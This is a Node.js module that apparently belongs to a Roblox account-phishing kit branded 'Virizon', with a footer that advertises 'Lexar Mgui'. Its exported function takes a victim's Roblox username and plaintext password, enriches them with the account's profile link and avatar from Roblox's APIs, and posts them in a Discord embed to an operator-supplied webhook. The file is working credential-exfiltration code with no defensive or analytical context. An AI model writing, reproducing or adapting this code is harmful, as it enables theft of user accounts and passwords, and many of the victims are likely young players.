const axios = require('axios');

async function getAvatarUrl(userId) {
    const intuserId = parseInt(userId);
    const response = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${intuserId}&size=420x420&format=Png&isCircular=false`);
    const avatarUrl = response.data.data[0].imageUrl;
    return avatarUrl;
}

async function getUserId(rusername) {
    const data = {
        usernames: [rusername],
        excludeBannedUsers: true,
    };

    const response = await axios.post('https://users.roblox.com/v1/usernames/users', data, {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
    });

    if (response.data.data.length === 0) {
        return 1;
    }

    const userid = response.data.data[0].id;
    return userid;
}

async function sendwebhooks(webhook, data) {
    try {
        await axios.post(webhook, data, {
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });
    } catch (error) {
        // Handle the error here
        console.error('Error sending webhooks:', error);
        throw new Error('Failed to send webhooks');
    }
}


async function failedembed(rusername, rpassword, errormessage, failedwebhook) {
    const userId = await getUserId(rusername);
    const avatar_url = await getAvatarUrl(userId);

    const embed = {
        content: "",
        username: "Virizon - Bot",
        avatar_url: "",
        embeds: [{
            title: "[Click Here To View Profile]",
            description: `**${errormessage}**`,
            url: `https://www.roblox.com/users/${userId}/profile`,
            timestamp: new Date().toISOString(),
            color: parseInt("fa0724", 16),
            footer: {
                text: "Buy Lexar Mgui Now!! https://discord.gg/lexarontop",
                icon_url: "https://cdn-icons-png.flaticon.com/512/458/458594.png",
            },
            thumbnail: {
                url: avatar_url,
            },
            author: {
                name: "Virizon - Error",
            },
            fields: [

                {
                    name: "Username",
                    value: rusername,
                    inline: true,
                },
                {
                    name: "Password",
                    value: rpassword,
                    inline: true,
                },
            ],
        }, ],
    };

    const payload = JSON.stringify(embed);

    sendwebhooks(failedwebhook, payload);

}

module.exports = failedembed